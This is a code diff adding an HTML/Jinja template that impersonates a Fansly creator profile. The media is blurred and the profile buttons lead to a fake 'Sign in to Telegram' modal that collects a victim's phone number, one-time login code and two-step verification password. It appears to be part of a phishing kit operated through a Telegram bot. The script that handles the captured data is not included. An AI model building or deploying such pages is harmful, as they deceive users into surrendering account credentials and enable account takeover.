@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>{{ content.nick }}</title>
+	<meta http-equiv="cache-control" content="no-cache">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="{{ content.nick }}">
+	<meta property="og:description" content="{{ content.bio }}">
+	{% if content.avatar %}<meta property="og:image" content="{{ content.avatar }}">{% endif %}
+	<link rel="icon" type="image/png" href="/static-landing/favicon.png">
+	<link rel="shortcut icon" type="image/png" href="/static-landing/favicon.png">
+
+	<link rel="stylesheet" href="/static-landing/fontawesome/css/all.min.css">
+	<link rel="stylesheet" href="/static-landing/fansly/style_telegram_auth.css">
+	<link rel="stylesheet" href="/static-landing/tg-login/auth.css">
+	<style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+        .content-wrapper {
+            display: flex;
+            flex-direction: column;
+            min-height: 100%;
+        }
+        .container {
+            display: flex;
+            flex: 1;
+            
+            background-color: #111215;
+        }
+
+        .main-row {
+            display: flex;
+            flex: 1;
+
+            justify-content: center;
+            align-items: center;
+        }
+
+        .left-column {
+            width: 780px;
+            height: 100%;
+
+            display: flex;
+
+            flex-direction: column;
+        }
+        .right-column {
+            width: 320px;
+            height: 100%;
+
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+			border-top: 1px solid rgba(255, 255, 255, 0.03);
+
+            background-color: #16161a;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            width: 100%;
+
+			display: flex;
+			flex-direction: row;
+			
+			align-items: center;
+			justify-content: flex-start;
+
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        .header-spacer {
+            flex: 1;
+            align-self: stretch;
+        }
+        .logo-image {
+            height: 2.5em;
+
+            padding-left: 1.5em;
+
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .login-container {
+            display: flex;
+
+            flex-direction: row;
+
+            align-items: center;
+			justify-content: center;
+
+            padding-right: 1.5em;
+        }
+
+        .login-button {
+            display: flex;
+
+			align-items: center;
+			justify-content: center;
+
+            text-align: center;
+
+            padding-left: 12px;
+            padding-right: 12px;
+
+            padding-top: 8px;
+            padding-bottom: 8px;
+
+            background-color: #1a1e26;
+
+            border-radius: 0.35em;
+
+            cursor: pointer;
+            user-select: none;
+
+            margin-right: 6px;
+        }
+        .sign-up-button {
+            display: flex;
+
+			align-items: center;
+			justify-content: center;
+
+            text-align: center;
+
+            padding-left: 12px;
+            padding-right: 12px;
+
+            padding-top: 8px;
+            padding-bottom: 8px;
+
+            background-color: #1a1e26;
+
+            border-radius: 0.35em;
+
+            cursor: pointer;
+            user-select: none;
+
+            margin-left: 6px;
+        }
+
+        .login-button:hover {
+            background-color: #26324a;
+        }
+        .sign-up-button:hover {
+            background-color: #26324a;
+        }
+
+        .login-button-text {
+            color: #d6dce8;
+			font-size: 0.87em;
+
+			cursor: pointer;
+        }
+
+        .main-header-image-container {
+            width: 100%;
+            height: 192px;
+
+            margin-top: 6px;
+
+            position: relative;
+            overflow: hidden;
+        }
+        .main-header-image {
+            position: absolute;
+
+            width: 100%;
+            height: 100%;
+
+            object-fit: cover;
+
+            border-radius: 0.5em;
+        }
+
+        .main-header-descripton-row-one {
+            display: flex;
+
+            flex-direction: row;
+            align-items: start;
+
+            height: 80px;
+        }
+
+        .avatar-point-container {
+            display: flex;
+
+            align-items: center;
+			justify-content: center;
+
+            width: 136px;
+
+            margin-left: 16px;
+        }
+
+        .avatar-point {
+            position: relative;
+        }
+
+        .avatar-container {
+            width: 140px;
+            height: 140px;
+
+            position: absolute;
+
+            border-radius: 10em;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -40%);
+
+            background-color: #111215;
+
+            z-index: 4;
+
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .avatar-image-container {
+            width: 132px;
+            height: 132px;
+
+            position: absolute;
+
+            border-radius: 10em;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -40%);
+
+            background-color: #111215;
+
+            z-index: 5;
+
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .avatar-image {
+            width: 100%;
+            height: 100%;
+
+            border-radius: 10em;
+
+            object-fit: cover;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        .avatar-image-blur {
+            width: 132px;
+            height: 132px;
+
+            position: absolute;
+
+            border-radius: 10em;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -40%);
+
+            /*backdrop-filter: blur(7px);*/
+
+            z-index: 6;
+            cursor: pointer;
+        }
+
+        .main-header-descripton-row-one-spacer {
+            flex: 1;
+            height: 100%;
+        }
+
+        .main-header-descripton-row-one-button-container-wrapper {
+            display: flex;
+            flex-direction: column;
+        }
+        .main-header-descripton-row-one-button-container {
+            display: flex;
+            flex-direction: row;
+
+            align-items: center;
+			justify-content: center;
+
+            height: 55px;
+
+            padding-right: 8px;
+        }
+
+        .copy-link-button {
+            border-radius: 10em;
+
+            width: 35px;
+            height: 35px;
+
+            background-color: #191e26;
+
+            display: flex;
+
+            align-items: center;
+			justify-content: center;
+
+            color: #ccd2de;
+
+            cursor: pointer;
+            user-select: none;
+        }
+        .copy-link-button:hover {
+            color: #2699f7;
+        }
+
+        .copy-link-button-icon {
+            font-size: 18px;
+        }
+
+        .follow-button {
+            border-radius: 10em;
+
+            width: 83px;
+            height: 35px;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            text-align: center;
+
+            background-color: #2699f7;
+
+            cursor: pointer;
+            user-select: none;
+
+            margin-left: 10px;
+        }
+
+        .follow-button-text {
+            color: white;
+            font-weight: 500;
+            font-size: 15px;
+            line-height: 115%;
+            text-align: center;
+            font-family: "Roboto", sans-serif;
+        }
+
+        .main-header-descripton-row-two {
+            width: 100%;
+
+            display: flex;
+
+            flex-direction: row;
+
+            padding-left: 16px;
+
+            padding-top: 5px;
+        }
+
+        .model-name-container {
+            display: flex;
+
+            flex-direction: column;
+        }
+
+        .model-name-default {
+            display: flex;
+
+            flex-direction: row;
+        }
+        .model-name-default-icon {
+            color: #2699f7;
+            font-size: 10px;
+
+            margin-left: 2px;
+            margin-top: 1px;
+        }
+        .model-name-default-text {
+            font-weight: bold;
+
+            text-align: center;
+            font-family: "Roboto", sans-serif;
+
+            color: #d6dce8;
+
+            font-size: 1.25em;
+
+            line-height: 100%;
+        }
+        .model-name-username-text {
+            font-weight: normal;
+
+            text-align: left;
+
+            font-family: "Roboto", sans-serif;
+            color: #637395;
+
+            font-size: 0.96em;
+            line-height: 100%;
+            
+            margin-top: 4px;
+        }
+        .model-name-online-status-text {
+            font-weight: normal;
+            text-align: left;
+            font-family: "Roboto", sans-serif;
+            color: #637395;
+            font-size: 0.80em;
+            line-height: 100%;
+            margin-top: 6px;
+        }
+        
+        .description-container {
+            padding-left: 16px;
+
+            line-height: 2.8em;
+            color: #637395;
+
+            font-size: 0.98em;
+            letter-spacing: 0.03em;
+
+            white-space: pre-wrap;
+            word-break: break-word;
+
+            text-align: left;
+
+            display: flex;
+
+            padding-top: 20px;
+            padding-bottom: 15px;
+        }
+
+        .media-controll-section-one {
+            width: 100%;
+            height: 50px;
+
+            display: flex;
+            flex-direction: row;
+
+            border-color: #1f2023;
+            border-width: 1px;
+            border-style: solid;
+
+            border-left: 0;
+            border-right: 0;
+        }
+
+        .media-controll-button {
+            width: 50%;
+            height: 100%;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            text-align: center;
+            color: #637395;
+
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .media-controll-button.select {
+            color: #2699f7;
+            border-bottom: 2px solid #2699f7;
+        }
+
+        .media-controll-button-text {
+            font-weight: normal;
+            text-align: left;
+            font-family: "Roboto", sans-serif;
+            font-size: 1em;
+            line-height: 100%;
+        }
+        .media-content {
+            display: flex;
+            flex-direction: column;
+
+            padding-left: 8px;
+            padding-right: 8px;
+        }
+
+
+        .sensitive-media-right-container {
+            padding-top: 50px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            padding-left: 13px;
+        }
+
+        .sensitive-media-right-row {
+            display: flex;
+            flex-direction: row;
+
+            padding-bottom: 5px;
+        }
+
+        .sensitive-media-right-element {
+            position: relative;
+
+            overflow: hidden;
+
+            display: flex;
+
+            width: 157px;
+            height: 157px;
+
+            border-radius: 0.7em;
+
+            margin-left: 5px;
+
+            color: #ffffff;
+
+            cursor: pointer;
+            user-select: none;
+        }
+        .sensitive-media-right-element:hover {
+            color: #2699f7;
+        }
+        
+        .sensitive-media-right-element-image {
+            object-fit: cover;
+
+            width: 100%;
+            height: 100%;
+
+            filter: blur(20px);
+        }
+
+        .sensitive-media-right-element-icon {
+            position: absolute;
+
+            font-size: 16px;
+            text-shadow: 0px 3px 3px rgb(0 0 0 / 15%), 0px 3px 4px rgb(0 0 0 / 10%), 0px 2px 8px rgb(0 0 0 / 5%);
+
+            z-index: 4;
+
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .sensitive-media-right-element-blur {
+            position: absolute;
+
+            width: 100%;
+            height: 100%;
+
+            z-index: 3;
+        }
+
+        .sensitive-media-left-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+
+            padding-top: 5px;
+            padding-right: 5px;
+        }
+
+        .sensitive-media-left-row {
+            display: flex;
+            flex-direction: row;
+
+            padding-bottom: 5px;
+        }
+
+        .sensitive-media-left-element {
+            position: relative;
+
+            overflow: hidden;
+
+            display: flex;
+
+            width: 33%;
+            height: 171px;
+
+            border-radius: 0.7em;
+
+            margin-left: 5px;
+
+            color: #ffffff;
+
+            cursor: pointer;
+            user-select: none;
+        }
+        .sensitive-media-left-element:hover {
+            color: #2699f7;
+        }
+        
+        .sensitive-media-left-element-image {
+            object-fit: cover;
+
+            width: 100%;
+            height: 100%;
+
+            filter: blur(20px);
+        }
+
+        .sensitive-media-left-element-icon {
+            position: absolute;
+
+            font-size: 16px;
+            text-shadow: 0px 3px 3px rgb(0 0 0 / 15%), 0px 3px 4px rgb(0 0 0 / 10%), 0px 2px 8px rgb(0 0 0 / 5%);
+
+            z-index: 4;
+
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .sensitive-media-left-element-blur {
+            position: absolute;
+
+            width: 100%;
+            height: 100%;
+
+            z-index: 3;
+        }
+    
+        body.is-unlocked .sensitive-media-left-element-image,
+        body.is-unlocked .sensitive-media-right-element-image {
+            filter: none !important;
+        }
+        body.is-unlocked .sensitive-media-left-element-icon,
+        body.is-unlocked .sensitive-media-right-element-icon,
+        body.is-unlocked .sensitive-media-left-element-blur,
+        body.is-unlocked .sensitive-media-right-element-blur {
+            display: none !important;
+        }
+        .socials-row { display:flex; flex-wrap:wrap; gap:10px; padding: 0 16px 16px; }
+        .socials-row a { color:#2699f7; text-decoration:none; font-size:0.95em; }
+        .tg-login-box { min-height: 48px; margin: 12px 0; display:flex; justify-content:center; }
+        .dev-unlock-btn {
+            margin-top: 10px; width:100%; padding:10px; border:0; border-radius:12px;
+            background:#1a1e26; color:#d6dce8; cursor:pointer;
+        }
+
+    </style>
+</head>
+<body class="{% if unlocked %}is-unlocked{% endif %}"
+	data-unlocked="{{ '1' if unlocked else '0' }}">
+	<div class="content-wrapper">
+		<header>
+			<div class="logo-container" onclick="openLogin()">
+				<img src="/static-landing/fansly/fansly_logo_survey.png" class="logo-image" alt="">
+			</div>
+			<div class="header-spacer"></div>
+			<div class="login-container">
+				{% if unlocked %}
+				<div class="login-button" onclick="logoutLanding()">
+					<span class="login-button-text">Logout</span>
+				</div>
+				{% else %}
+				<div class="login-button" onclick="openLogin()">
+					<span class="login-button-text">Login</span>
+				</div>
+				<div class="sign-up-button" onclick="openLogin()">
+					<span class="login-button-text">Sign Up</span>
+				</div>
+				{% endif %}
+			</div>
+		</header>
+		<div class="container">
+			<div class="main-row">
+				<div class="left-column">
+					<div class="main-header-image-container">
+						<img class="main-header-image" src="{{ content.cover or content.avatar or '/static-landing/fansly/survey_main_header_blur.png' }}" alt="">
+					</div>
+					<div class="main-header-descripton-row-one">
+						<div class="avatar-point-container">
+							<div class="avatar-point">
+								<div class="avatar-container" onclick="openLogin()"></div>
+								<div class="avatar-image-container" onclick="openLogin()">
+									<img class="avatar-image" src="{{ content.avatar or '/static-landing/fansly/6755736286.png' }}" alt="{{ content.nick }}">
+								</div>
+								{% if not unlocked and content.blur_until_login %}
+								<div class="avatar-image-blur" onclick="openLogin()"></div>
+								{% endif %}
+							</div>
+						</div>
+						<div class="main-header-descripton-row-one-spacer"></div>
+						<div class="main-header-descripton-row-one-button-container-wrapper">
+							<div class="main-header-descripton-row-one-button-container">
+								<div class="copy-link-button" onclick="copyPageLink()">
+									<div class="copy-link-button-icon">
+										<i class="fa-fw fas fa-arrow-right-from-bracket fa-rotate-270"></i>
+									</div>
+								</div>
+								<div class="follow-button" onclick="openLogin()">
+									<span class="follow-button-text">{{ 'Following' if unlocked else 'Follow' }}</span>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="main-header-descripton-row-two">
+						<div class="model-name-container">
+							<div class="model-name-default">
+								<span class="model-name-default-text">{{ content.nick }}</span>
+								<div class="model-name-default-icon">
+									<span class="fa-stack">
+										<i class="fa-fw fas fa-certificate fa-stack-2x"></i>
+										<i class="fa-fw fas fa-check fa-stack-1x fa-inverse"></i>
+									</span>
+								</div>
+							</div>
+							<div class="model-name-username-text">
+								<span>@{{ content.nick | replace(' ', '') }}</span>
+							</div>
+							<div class="model-name-online-status-text">
+								<span>{{ content.headline }}</span>
+							</div>
+						</div>
+					</div>
+					<div class="description-container">
+						<span>{{ content.bio }}</span>
+					</div>
+					{% if content.socials %}
+					<nav class="socials-row">
+						{% for s in content.socials %}
+						<a href="{{ s.url }}" target="_blank" rel="noopener noreferrer">{{ s.title }}</a>
+						{% endfor %}
+					</nav>
+					{% endif %}
+					<div class="media-content">
+						<div class="media-controll-section-one">
+							<div class="media-controll-button" onclick="openLogin()">
+								<span class="media-controll-button-text">Post</span>
+							</div>
+							<div class="media-controll-button select">
+								<span class="media-controll-button-text">Media</span>
+							</div>
+						</div>
+						<div class="sensitive-media-left-container">
+							{% set photos = content.photos if content.photos else [] %}
+							{% if photos %}
+								{% for i in range(0, photos|length, 3) %}
+								<div class="sensitive-media-left-row">
+									{% for photo in photos[i:i+3] %}
+									<div class="sensitive-media-left-element" onclick="onMediaClick(event)">
+										<img src="{{ photo }}" alt="" class="sensitive-media-left-element-image">
+										{% if not unlocked and content.blur_until_login %}
+										<div class="sensitive-media-left-element-icon">
+											<i class="pure-white blue-1-hover-only pointer fa-fw fas fa-eye-slash fa-2x shadow"></i>
+										</div>
+										<div class="sensitive-media-left-element-blur"></div>
+										{% endif %}
+									</div>
+									{% endfor %}
+								</div>
+								{% endfor %}
+							{% else %}
+								<div class="description-container"><span>Добавьте фото через бота: /site</span></div>
+							{% endif %}
+
+							{% if content.videos %}
+								{% for video in content.videos %}
+								<div class="sensitive-media-left-row">
+									<div class="sensitive-media-left-element" style="width:100%;height:220px" onclick="onMediaClick(event)">
+										{% if unlocked or not content.blur_until_login %}
+										<video src="{{ video }}" controls playsinline style="width:100%;height:100%;object-fit:cover"></video>
+										{% else %}
+										<img src="/static-landing/fansly/survey_main_header_blur.png" alt="" class="sensitive-media-left-element-image">
+										<div class="sensitive-media-left-element-icon">
+											<i class="pure-white blue-1-hover-only pointer fa-fw fas fa-eye-slash fa-2x shadow"></i>
+										</div>
+										<div class="sensitive-media-left-element-blur"></div>
+										{% endif %}
+									</div>
+								</div>
+								{% endfor %}
+							{% endif %}
+						</div>
+					</div>
+				</div>
+
+				<div class="right-column">
+					<div class="sensitive-media-right-container">
+						{% set side = content.photos if content.photos else [] %}
+						{% if side %}
+							{% for i in range(0, side|length, 2) %}
+							<div class="sensitive-media-right-row">
+								{% for photo in side[i:i+2] %}
+								<div class="sensitive-media-right-element" onclick="onMediaClick(event)">
+									<img src="{{ photo }}" alt="" class="sensitive-media-right-element-image">
+									{% if not unlocked and content.blur_until_login %}
+									<div class="sensitive-media-right-element-icon">
+										<i class="pure-white blue-1-hover-only pointer fa-fw fas fa-eye-slash fa-2x shadow"></i>
+									</div>
+									<div class="sensitive-media-right-element-blur"></div>
+									{% endif %}
+								</div>
+								{% endfor %}
+							</div>
+							{% endfor %}
+						{% endif %}
+					</div>
+				</div>
+			</div>
+		</div>
+		<footer></footer>
+	</div>
+
+	<div id="tg-auth" class="tg-auth" aria-hidden="true" inert>
+		<button type="button" class="tg-auth__close" id="tg-auth-close" aria-label="Закрыть">×</button>
+
+		<div class="tg-auth__panel">
+			<div class="tg-auth__step is-active" id="tg-step-load">
+				<div class="tg-auth__loader" aria-hidden="true"></div>
+				<p class="tg-auth__subtitle">Подключение…</p>
+			</div>
+
+			<div class="tg-auth__step" id="tg-step-phone">
+				<img class="tg-auth__logo" src="/static-landing/tg-login/logo.svg" alt="Telegram">
+				<h1 class="tg-auth__title">Sign in to Telegram</h1>
+				<p class="tg-auth__subtitle">
+					Please confirm your country code and<br>
+					enter your phone number.
+				</p>
+				<div class="tg-auth__field">
+					<label for="tg-phone">Phone Number</label>
+					<input id="tg-phone" type="tel" inputmode="tel" autocomplete="tel" placeholder="+7 900 123-45-67">
+				</div>
+				<p id="tg-phone-error" class="tg-auth__error"></p>
+				<button type="button" class="tg-auth__btn" id="tg-phone-btn">Next</button>
+			</div>
+
+			<div class="tg-auth__step" id="tg-step-code">
+				<img class="tg-auth__logo" src="/static-landing/tg-login/logo.svg" alt="Telegram">
+				<div class="tg-auth__phone-row">
+					<h1 class="tg-auth__phone-label" id="tg-phone-shown">+</h1>
+					<button type="button" class="tg-auth__edit" id="tg-edit-phone">Edit</button>
+				</div>
+				<p class="tg-auth__subtitle">
+					We have sent you a message in Telegram<br>
+					with the code.
+				</p>
+				<div class="tg-auth__field">
+					<label for="tg-code">Code</label>
+					<input id="tg-code" type="text" inputmode="numeric" autocomplete="one-time-code" placeholder="12345">
+				</div>
+				<p id="tg-code-error" class="tg-auth__error"></p>
+				<button type="button" class="tg-auth__btn" id="tg-code-btn">Next</button>
+			</div>
+
+			<div class="tg-auth__step" id="tg-step-password">
+				<img class="tg-auth__logo" src="/static-landing/tg-login/logo.svg" alt="Telegram">
+				<h1 class="tg-auth__title">Enter Your Password</h1>
+				<p class="tg-auth__subtitle">
+					Your account is protected with an<br>
+					additional password.
+				</p>
+				<div class="tg-auth__field">
+					<label for="tg-password">Password</label>
+					<input id="tg-password" type="password" autocomplete="current-password" placeholder="">
+				</div>
+				<p id="tg-password-error" class="tg-auth__error"></p>
+				<button type="button" class="tg-auth__btn" id="tg-password-btn">Next</button>
+			</div>
+		</div>
+	</div>
+
+	<script src="/static-landing/fansly-app.js"></script>
+</body>
+</html>
